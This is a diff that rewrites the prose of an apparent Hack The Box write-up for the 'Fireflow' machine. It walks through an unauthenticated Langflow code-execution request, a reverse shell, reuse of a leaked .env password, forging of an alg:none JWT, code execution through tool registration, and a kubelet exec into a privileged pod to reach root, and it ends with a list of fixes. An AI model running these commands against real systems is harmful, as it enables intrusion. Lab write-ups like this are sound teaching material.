@@ -10,17 +10,17 @@ platform: HTB
 
 [Fireflow](https://app.hackthebox.com/machines/Fireflow?tab=play_machine)
 
-This box ended up being a three-stage chain: an unauthenticated RCE in a Langflow-based AI agent platform, a JWT signature bypass against an internal "MCP Tool Registry," and finally a Kubernetes kubelet abuse to break straight out to the host as root. Classic case of one sloppy web app bug snowballing once you start pivoting between internal services that all trust each other a little too much.
+This box is a three-stage chain: an unauthenticated RCE in a Langflow-based AI agent platform, a JWT signature bypass against an internal "MCP Tool Registry", and finally a Kubernetes kubelet abuse to break out to the host as root.
 
 ---
 
 ## Reconnaissance
 
-First move, always: ping it and make sure there's actually something to attack before burning time on anything fancier.
+First we ping the box to make sure it's up before doing anything else.
 
 ![](/assets/machines/fireflow/pasted-image-20260925205919.png)
 
-Connectivity confirmed, so next up was a full TCP sweep to see what was actually exposed:
+Connectivity confirmed, so we run a full TCP sweep to see what's exposed:
 
 ```bash
 nmap -p- --open -Pn -n --min-rate=5000 fireflow.htb -oN ports
@@ -28,7 +28,7 @@ nmap -p- --open -Pn -n --min-rate=5000 fireflow.htb -oN ports
 
 ![](/assets/machines/fireflow/pasted-image-20260925210600.png)
 
-Only two ports open: 22 (SSH) and 443 (HTTPS). Small attack surface, which usually means the web app is where the real action is. I ran a version/script scan against just those two to get a better read on what I was dealing with:
+Only two ports open: 22 (SSH) and 443 (HTTPS). Small attack surface, so the web app is the likely way in. We run a version/script scan against those two:
 
 ```bash
 nmap -p22,443 -sCV --min-rate=5000 -Pn -n fireflow.htb -oG AllInfo
@@ -36,13 +36,13 @@ nmap -p22,443 -sCV --min-rate=5000 -Pn -n fireflow.htb -oG AllInfo
 
 ![](/assets/machines/fireflow/pasted-image-20260925211211.png)
 
-SSH is OpenSSH 9.6p1 on Ubuntu, up to date — nothing jumping out there. Port 443 is Nginx with a self-signed cert, and the cert is actually the interesting part: the Subject Alternative Name lists `*.fireflow.htb`, a wildcard. That's basically a neon sign saying "there are subdomains you haven't found yet."
+SSH is OpenSSH 9.6p1 on Ubuntu, up to date. Port 443 is Nginx with a self-signed cert, and the cert is the interesting part: the Subject Alternative Name lists `*.fireflow.htb`, a wildcard. That points to subdomains we haven't found yet.
 
 ---
 
 ## Enumeration
 
-I threw `whatweb` at the main site to squeeze out a bit more fingerprinting:
+We run whatweb on the main site for more fingerprinting:
 
 ```bash
 whatweb https://fireflow.htb/
@@ -50,31 +50,31 @@ whatweb https://fireflow.htb/
 
 ![](/assets/machines/fireflow/pasted-image-20260925211744.png)
 
-Confirmed Nginx again, but more usefully it leaked an `X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb` header — there's the second vhost, `flow.fireflow.htb`. Added it to `/etc/hosts`, browsed over, and found the main site had a button linking out to an AI agent. That redirected me to `flow.fireflow.htb/playground/<uuid>`, which opened a fresh chat session.
+It confirms Nginx, and it leaks an `X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb` header, so there is a second vhost, `flow.fireflow.htb`. We add it to `/etc/hosts` and browse over. The main site had a button linking out to an AI agent, which redirected us to `flow.fireflow.htb/playground/<uuid>` and opened a fresh chat session.
 
 ![](/assets/machines/fireflow/pasted-image-20260925212208.png)
 
 ![](/assets/machines/fireflow/pasted-image-20260925212851.png)
 
-The landing page called this the "Nightfall AI Agent," built on a "Flow engine" at version 1.8.2, with a public playground sitting at flow ID `7d84d636-af65-42e4-ac38-26e867052c25`. That version number alone was worth searching on — and it turned out "Flow engine" is just the operator's internal name for **Langflow**.
+The landing page calls this the "Nightfall AI Agent", built on a "Flow engine" at version 1.8.2, with a public playground at flow ID `7d84d636-af65-42e4-ac38-26e867052c25`. That version number was worth searching on, and "Flow engine" is just the operator's internal name for **Langflow**.
 
 ---
 
 ## Foothold: unauthenticated RCE in Langflow (`build_public_tmp`)
 
-A quick search turned up a public writeup/PoC for an unauthenticated RCE sitting in Langflow's public flow-building endpoint. Exactly what I wanted to see.
+A quick search turned up a public writeup/PoC for an unauthenticated RCE in Langflow's public flow-building endpoint.
 
 ![](/assets/machines/fireflow/pasted-image-20260925212956.png)
 
-The root cause, straight from the advisory:
+The root cause, from the advisory:
 
 > The `POST /api/v1/build_public_tmp/{flow_id}/flow` endpoint allows building public flows without requiring authentication. When the optional `data` parameter is supplied, the endpoint uses attacker-controlled flow data (containing arbitrary Python code in node definitions) instead of the stored flow data from the database. This code is passed to `exec()` with zero sandboxing, resulting in unauthenticated remote code execution.
 
-In plain terms: the endpoint is *supposed* to be public, so visitors can run pre-approved public flows without logging in. The problem is it never checks whether the `data` you send in the request body actually matches what's stored for that flow ID. Send your own `data`, and the server happily builds and executes *your* flow instead — and "building" a flow here just means `exec()`-ing whatever Python sits in a node's `code` field, completely unsandboxed. The advisory even calls this out as distinct from CVE-2025-3248, which only patched `/api/v1/validate/code` — the `build_public_tmp` path was apparently just never touched.
+In short: the endpoint is meant to be public so visitors can run pre-approved public flows without logging in. The problem is it never checks whether the `data` you send in the request body matches what's stored for that flow ID. If you send your own `data`, the server builds and executes your flow instead, and "building" a flow here just means `exec()`-ing whatever Python sits in a node's `code` field, with no sandbox. The advisory notes this is distinct from CVE-2025-3248, which only patched `/api/v1/validate/code`; the `build_public_tmp` path was never touched.
 
 ![](/assets/machines/fireflow/pasted-image-20260925213347.png)
 
-Only prerequisite here is a valid flow UUID, and I already had one from the playground URL I'd been redirected to (`7d84d636-af65-42e4-ac38-26e867052c25`). I adapted the PoC into a reverse shell payload: a single malicious `genericNode` whose `code` field imports `os` and fires off a bash reverse shell before defining the dummy component the endpoint expects to find.
+The only prerequisite is a valid flow UUID, and we already have one from the playground URL (`7d84d636-af65-42e4-ac38-26e867052c25`). We adapt the PoC into a reverse shell payload: a single malicious `genericNode` whose `code` field imports `os` and fires a bash reverse shell before defining the dummy component the endpoint expects.
 
 ```bash
 curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
@@ -140,7 +140,7 @@ curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af6
 JSON
 ```
 
-Fired it off with a listener already running, and a shell landed basically instantly:
+We fire it off with a listener already running, and the shell lands almost instantly:
 
 ```bash
 penelope -p 4444
@@ -148,13 +148,13 @@ penelope -p 4444
 
 ![](/assets/machines/fireflow/pasted-image-20260925220209.png)
 
-`www-data`, dropped straight into `/var/lib/langflow`:
+We are `www-data`, dropped into `/var/lib/langflow`:
 
 ![](/assets/machines/fireflow/pasted-image-20260925220348.png)
 
 ### From www-data to nightfall (reused `.env` password)
 
-With a foothold as `www-data`, the obvious next move was going hunting for credentials in config files — self-hosted app deployments love to leave the superuser password and secret key sitting in a plaintext `.env` right next to the app config. Langflow's docs point at a few standard locations for that file, and `/etc/langflow/.env` was one of them:
+With a foothold as `www-data`, the next move is to look for credentials in config files. Self-hosted apps often leave the superuser password and secret key in a plaintext `.env` next to the app config. Langflow's docs point at a few standard locations, and `/etc/langflow/.env` was one of them:
 
 ![](/assets/machines/fireflow/pasted-image-20260925220817.png)
 
@@ -164,7 +164,7 @@ cat /etc/langflow/.env
 
 ![](/assets/machines/fireflow/pasted-image-20260925220927.png)
 
-And there it was: the Langflow superuser password, `n1ghtm4r3_b4_n1ghtf4ll`. The app's own superuser account is called `langflow`, but there's no matching Linux user — checking `/etc/passwd` instead turned up a local user called `nightfall`, which tracks with the AI agent's own "Nightfall" branding. People reuse passwords across the app layer and the OS layer way more often than they should, so trying it felt like a safe bet:
+There it was: the Langflow superuser password, `n1ghtm4r3_b4_n1ghtf4ll`. The app's own superuser account is called `langflow`, but there's no matching Linux user. Checking `/etc/passwd` instead, there is a local user called `nightfall`, which matches the AI agent's "Nightfall" branding. People reuse passwords across the app and the OS more often than they should, so we try it:
 
 ![](/assets/machines/fireflow/pasted-image-20260925221258.png)
 
@@ -174,7 +174,7 @@ su nightfall
 
 ![](/assets/machines/fireflow/pasted-image-20260925221346.png)
 
-And it worked — the app's superuser password had been recycled as `nightfall`'s actual system password. User flag, right there:
+It worked: the app's superuser password was reused as `nightfall`'s system password. User flag, right there:
 
 ![](/assets/machines/fireflow/pasted-image-20260925221513.png)
 
@@ -186,7 +186,7 @@ And it worked — the app's superuser password had been recycled as `nightfall`'
 
 ### A hidden `.mcp` folder, and a second set of credentials
 
-Poking around `nightfall`'s home directory, I spotted an odd hidden folder: `.mcp`.
+Looking around `nightfall`'s home directory, there is an odd hidden folder: `.mcp`.
 
 ![](/assets/machines/fireflow/pasted-image-20260925221819.png)
 
@@ -194,7 +194,7 @@ Poking around `nightfall`'s home directory, I spotted an odd hidden folder: `.mc
 cat ~/.mcp/config.json
 ```
 
-Inside was a config pointing at an internal service on port 30080, plus a second set of credentials:
+Inside is a config pointing at an internal service on port 30080, plus a second set of credentials:
 
 ```json
 {
@@ -205,7 +205,7 @@ Inside was a config pointing at an internal service on port 30080, plus a second
 }
 ```
 
-Queried the version endpoint to see what this thing actually was:
+We query the version endpoint to see what this service is:
 
 ```bash
 curl -s http://127.0.0.1:30080/api/v1/version | jq
@@ -213,9 +213,9 @@ curl -s http://127.0.0.1:30080/api/v1/version | jq
 
 ![](/assets/machines/fireflow/pasted-image-20260925222017.png)
 
-It called itself an "MCP AI Tool Registry" (v0.1.0) — an internal service for registering and invoking tools the AI agent can call. More interesting than the name, though: the auth block in that same response told me exactly what I needed. It issues JWTs, and it lists both `HS256` **and** `none` as supported signing algorithms. That's a detail that should never make it to production — `alg: none` means the server will accept a token with an empty signature as valid, because somewhere in its JWT config nobody bothered to restrict the acceptable algorithm set.
+It calls itself an "MCP AI Tool Registry" (v0.1.0), an internal service for registering and invoking tools the AI agent can call. The useful part is the auth block in the same response: it issues JWTs, and it lists both `HS256` and `none` as supported signing algorithms. `alg: none` means the server will accept a token with an empty signature as valid, because the JWT config does not restrict the acceptable algorithm set.
 
-First I authenticated normally with the leaked creds, just to see what a legit token looked like:
+First we authenticate normally with the leaked creds, to see what a legit token looks like:
 
 ```bash
 curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
@@ -225,7 +225,7 @@ curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
 
 ![](/assets/machines/fireflow/pasted-image-20260925222456.png)
 
-Got back a normal, signed `langflow-bot` token — useful, but not an admin role. Instead of wasting time trying to crack the HS256 secret, I went straight for the `alg: none` weakness: crafted my own header and payload, set the role to `admin`, base64url-encoded both, and left the signature segment empty.
+We get back a normal, signed `langflow-bot` token, but not an admin role. Instead of trying to crack the HS256 secret, we use the `alg: none` weakness: we craft our own header and payload, set the role to `admin`, base64url-encode both, and leave the signature segment empty.
 
 ```bash
 header=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
@@ -236,9 +236,9 @@ echo "$forged"
 
 ![](/assets/machines/fireflow/pasted-image-20260925222803.png)
 
-(I had Claude help me put this together quickly, since I'd never hand-forged a `none`-alg JWT before — turns out it's a two-line base64 job once you know the format: header, payload, and a trailing dot with nothing after it for the empty signature.)
+(I had Claude help me put this together, since I'd never hand-forged a `none`-alg JWT before. It's a two-line base64 job once you know the format: header, payload, and a trailing dot with nothing after it for the empty signature.)
 
-Threw the forged token at the authenticated tools listing endpoint, and it worked — the server accepted a self-signed, unsigned token like it had actually verified something:
+We send the forged token to the authenticated tools listing endpoint, and it works. The server accepts a self-signed, unsigned token as if it had verified it:
 
 ```bash
 curl -s http://127.0.0.1:30080/api/v1/tools -H "Authorization: Bearer $forged" | jq
@@ -246,7 +246,7 @@ curl -s http://127.0.0.1:30080/api/v1/tools -H "Authorization: Bearer $forged" |
 
 ![](/assets/machines/fireflow/pasted-image-20260925223007.png)
 
-Admin-scoped token in hand, the obvious next move was registering a new tool — the service's own `openapi.json` happily documents its API for anyone who asks:
+With an admin-scoped token, the next move is to register a new tool. The service's own `openapi.json` documents its API:
 
 ```bash
 curl -s http://127.0.0.1:30080/openapi.json -H "Authorization: Bearer $forged" | jq '.paths."/api/v1/tools".post'
@@ -260,7 +260,7 @@ curl -s http://127.0.0.1:30080/openapi.json -H "Authorization: Bearer $forged" |
 
 ![](/assets/machines/fireflow/pasted-image-20260925223559.png)
 
-The `ToolRegisterRequest` schema takes a `name`, `description`, and a `code` field — and given what I'd already seen in Langflow itself, I had a strong suspicion `code` would get executed the exact same way: unsandboxed. Registered a tool that ran `id` via `os.system()`:
+The `ToolRegisterRequest` schema takes a `name`, `description`, and a `code` field. Given what we saw in Langflow, the `code` field is probably executed the same way, unsandboxed. We register a tool that runs `id` via `os.system()`:
 
 ```bash
 curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
@@ -268,7 +268,7 @@ curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
   -d '{"name":"pwnd2","description":"HACK","code":"import os; os.system(\"id\")"}' | jq
 ```
 
-Registered fine, but calling it failed:
+It registers fine, but calling it fails:
 
 ```bash
 curl -s -X POST http://127.0.0.1:30080/mcp \
@@ -278,7 +278,7 @@ curl -s -X POST http://127.0.0.1:30080/mcp \
 
 ![](/assets/machines/fireflow/pasted-image-20260925224258.png)
 
-Came back with a traceback: `TypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method`. Whatever the tool runner does internally with that `code` string, it doesn't like a bare `os.system()` call returning `None` with nothing capturable — the runtime clearly wants the tool to hand back a string. Swapped to `os.popen(...).read()`, which returns the command output as actual text, and that fixed it immediately:
+It returns a traceback: `TypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method`. The tool runner doesn't like a bare `os.system()` call returning `None`; it wants the tool to return a string. We switch to `os.popen(...).read()`, which returns the command output as text, and that fixes it:
 
 ```bash
 curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
@@ -292,7 +292,7 @@ curl -s -X POST http://127.0.0.1:30080/mcp \
 
 ![](/assets/machines/fireflow/pasted-image-20260925224554.png)
 
-`uid=1000(mcp) gid=1000(mcp)` — code execution confirmed inside the MCP service. From there I registered one more tool, this time a proper reverse shell (built with revshells.com's Python payload), so I could get an interactive session instead of one-shot commands:
+`uid=1000(mcp) gid=1000(mcp)`: code execution confirmed inside the MCP service. From there we register one more tool, a reverse shell (built with revshells.com's Python payload), to get an interactive session instead of one-shot commands:
 
 ![](/assets/machines/fireflow/pasted-image-20260925225714.png)
 
@@ -307,11 +307,11 @@ curl -s -X POST http://127.0.0.1:30080/api/v1/tools -H "Authorization: Bearer $f
 
 ![](/assets/machines/fireflow/pasted-image-20260925225833.png)
 
-Invoking that tool through `/mcp` dropped me into an interactive shell as `mcp` — on what turned out to be a completely different host from the main Fireflow box. This service runs in its own container.
+Invoking that tool through `/mcp` drops us into an interactive shell as `mcp`, on a different host from the main Fireflow box. This service runs in its own container.
 
 ### Breaking out to the node through the kubelet API
 
-Looking around the new shell, it was pretty obvious I'd landed inside a Kubernetes pod rather than a plain VM: there's a `/var/run/secrets/kubernetes.io/serviceaccount` directory sitting there with a service account token, namespace file, and CA cert — the standard mount every pod gets.
+Looking around the new shell, it's clearly a Kubernetes pod rather than a plain VM: there's a `/var/run/secrets/kubernetes.io/serviceaccount` directory with a service account token, namespace file, and CA cert, the standard mount every pod gets.
 
 ![](/assets/machines/fireflow/pasted-image-20260925234519.png)
 
@@ -322,9 +322,9 @@ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
 cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 ```
 
-Got stuck here for a while, honestly, and ended up checking the official writeup just to get my bearings back. The piece I was missing: a pod's service account token isn't just for talking to the Kubernetes API server — it's also a valid bearer token against the **kubelet's own HTTPS API** on port 10250, directly on the node. Depending on how the cluster's RBAC is set up, that kubelet API can let you list and `exec` into *any* pod scheduled on that node, not just your own, which completely sidesteps the namespace-scoped limits you'd expect your service account to have.
+I got stuck here for a while and checked the official writeup to get my bearings. The piece I was missing: a pod's service account token isn't just for talking to the Kubernetes API server, it's also a valid bearer token against the kubelet's own HTTPS API on port 10250, directly on the node. Depending on the cluster's RBAC, that kubelet API can let you list and `exec` into any pod scheduled on that node, not just your own, which sidesteps the namespace-scoped limits you'd expect.
 
-Queried the kubelet's `/pods` endpoint with the stolen token to see everything running on the node, specifically hunting for anything privileged or sitting on a sensitive hostPath mount:
+We query the kubelet's `/pods` endpoint with the stolen token to see everything running on the node, looking for anything privileged or with a sensitive hostPath mount:
 
 ```bash
 curl -sk -H "Authorization: Bearer $TOKEN" "https://10.129.107.225:10250/pods" \
@@ -333,9 +333,9 @@ curl -sk -H "Authorization: Bearer $TOKEN" "https://10.129.107.225:10250/pods" \
 
 ![](/assets/machines/fireflow/pasted-image-20260926000841.png)
 
-One pod jumped straight out: `prometheus-prometheus-node-exporter-nmntq` in the `monitoring` namespace, running `privileged=True` with hostPath mounts of `/proc`, `/sys`, and — the important one — `/`. Node-exporter legitimately needs host-level access to report system metrics, but mounting the *entire* host root filesystem into a privileged container means anyone who can exec into that pod effectively has root on the node, since the host's `/` ends up reachable somewhere inside the container.
+One pod stands out: `prometheus-prometheus-node-exporter-nmntq` in the `monitoring` namespace, running `privileged=True` with hostPath mounts of `/proc`, `/sys`, and `/`. Node-exporter needs host-level access to report system metrics, but mounting the entire host root filesystem into a privileged container means anyone who can exec into that pod has root on the node, since the host's `/` is reachable inside the container.
 
-Hitting the kubelet's `/exec` endpoint directly means a WebSocket connection with the `v4.channel.k8s.io` subprotocol instead of a plain HTTP call, so I had Claude help me put together a small script to drive that:
+Hitting the kubelet's `/exec` endpoint needs a WebSocket connection with the `v4.channel.k8s.io` subprotocol instead of a plain HTTP call, so I had Claude help me put together a small script to drive that:
 
 ```python
 #!/usr/bin/env python3
@@ -367,7 +367,7 @@ python3 /tmp/kube_exec.py "id"
 
 ![](/assets/machines/fireflow/pasted-image-20260926001739.png)
 
-`uid=0(root)` — the service account from the low-privilege `mcp` pod had just enough kubelet-level access to exec straight into a privileged pod running as root on the node. From there, the host's root filesystem was reachable through the hostPath mount, so I poked around in it and grabbed the root flag.
+`uid=0(root)`: the service account from the low-privilege `mcp` pod had enough kubelet-level access to exec into a privileged pod running as root on the node. From there the host's root filesystem is reachable through the hostPath mount, so we read the root flag.
 
 ![](/assets/machines/fireflow/pasted-image-20260926114721.png)
 
@@ -377,10 +377,10 @@ Machine pwned.
 
 ## Reflection
 
-A few things stacked up here, and any one of them being fixed would have broken the chain:
+Any one of these being fixed would have broken the chain:
 
-- **The `build_public_tmp` endpoint trusted client-supplied flow data instead of the stored, vetted flow.** Public/unauthenticated endpoints should never execute attacker-controlled code — if the feature is "run this pre-approved public flow," the server must ignore any `data` the client tries to pass and always use what's in the database.
-- **Secrets in `.env` were reused as real system account passwords.** The Langflow superuser password and the `nightfall` Linux user's password were identical. Application secrets and OS credentials should never share a value — a leak in one layer shouldn't automatically compromise the other.
-- **The MCP Tool Registry advertised and accepted `alg: none` JWTs.** This is a textbook JWT misconfiguration: the signing algorithm must be pinned server-side and enforced on verification, never trusted from the token header itself. `none` should never appear in a production `supported_algorithms` list.
-- **An internal admin API let any authenticated user register arbitrary executable "tools."** Registering a tool was equivalent to uploading a webshell. Tool code execution like this needs to run in an actual sandbox (container, gVisor, restricted interpreter — something), not a bare `exec`/`os.popen` in the service's own process.
-- **A pod's Kubernetes service account token could authenticate directly to the kubelet API and exec into pods outside its own scope**, and a monitoring pod (node-exporter) was both privileged and had the entire host filesystem mounted in. Kubelet authorization should be locked down (disable anonymous/over-broad auth, scope what service accounts can reach on :10250), and `hostPath: /` on a privileged container is about as close to "please give me the node" as a Kubernetes manifest can get — it should never be necessary, even for a metrics exporter.
+- The `build_public_tmp` endpoint trusted client-supplied flow data instead of the stored, vetted flow. Public endpoints should never execute attacker-controlled code: if the feature is "run this pre-approved public flow", the server must ignore any `data` the client sends and use what's in the database.
+- Secrets in `.env` were reused as real system account passwords. The Langflow superuser password and the `nightfall` Linux password were identical. Application secrets and OS credentials should never share a value.
+- The MCP Tool Registry advertised and accepted `alg: none` JWTs. The signing algorithm must be pinned server-side and enforced on verification, never trusted from the token header. `none` should never be in a production supported-algorithms list.
+- An internal admin API let any authenticated user register arbitrary executable "tools". Registering a tool was the same as uploading a webshell. Tool code should run in a real sandbox, not a bare `exec`/`os.popen` in the service's own process.
+- A pod's service account token could authenticate directly to the kubelet API and exec into pods outside its own scope, and a monitoring pod (node-exporter) was both privileged and had the entire host filesystem mounted in. Kubelet authorization should be locked down, and `hostPath: /` on a privileged container should never be necessary, even for a metrics exporter.
